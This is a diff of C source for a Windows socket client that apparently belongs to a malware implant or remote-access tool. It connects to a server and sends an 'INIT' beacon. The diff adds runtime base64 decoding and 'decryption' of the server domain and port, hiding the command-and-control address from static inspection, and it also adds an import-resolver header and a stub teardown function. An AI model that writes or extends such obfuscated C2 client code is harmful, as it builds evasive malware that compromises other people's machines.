@@ -4,9 +4,10 @@
 #include <time.h>
 #include <stdio.h>
 #include "socketManager.h"
-#include "MessageTypes.h"
-#include "importer/Importer.h"
-#include "Definitions.h"
+#include "../message/Message.h"
+#include "../Definitions.h"
+#include "../importer/Importer.h"
+#include "../crypto/Crypto.h"
 
 MESSAGE INIT_MESSAGE = {
     .payload = (PBYTE)"INIT",
@@ -14,7 +15,7 @@ MESSAGE INIT_MESSAGE = {
     .type = INIT_TYPE 
 }; 
 
-void createSocketManager(PSOCKET_MANAGER pSockManager)
+void initSocketManager(PSOCKET_MANAGER pSockManager)
 {
     /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
     WSADATA wsaData = {0};
@@ -34,13 +35,22 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
         return;
     }
 
+    DWORD serverStrLength = frombase64GetLength(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
+    PBYTE serverBlob = fromBase64GetBlob(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN), serverStrLength);
+    PCSTR server =  (PCSTR)encrypt(serverBlob, serverStrLength);
+
+    DWORD portStrLength = frombase64GetLength(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
+    PBYTE portBlob = fromBase64GetBlob(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER), portStrLength);
+    PCSTR portStr =  (PCSTR)encrypt(portBlob, portStrLength);
+    u_short port = atoi(portStr);
+
     struct sockaddr_in sockAddr =
     {
         .sin_family = AF_INET, 
-        .sin_port = htons(PORT)
+        .sin_port = htons(port)
     };
 
-    if (inet_pton(AF_INET, SERVER, &sockAddr.sin_addr) != 1)
+    if (inet_pton(AF_INET, server, &sockAddr.sin_addr) != 1)
     {
         printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
         return;
@@ -62,11 +72,9 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
     };
 
     printf("[+] Socket successfully intialized...\n");
-    PSTR auxServerName = NULL;
-    strcpy_s(auxServerName, strlen(SERVER), SERVER);
     SOCKET_MANAGER sManager = {
-        .port = PORT,
-        .server = auxServerName,
+        .port = port,
+        .server = server,
         .s = sock
     };
 
@@ -158,3 +166,8 @@ void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
     message->size = payloadSize;
     message->type = responseType;
 }
+
+BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
+{
+    return TRUE;
+};
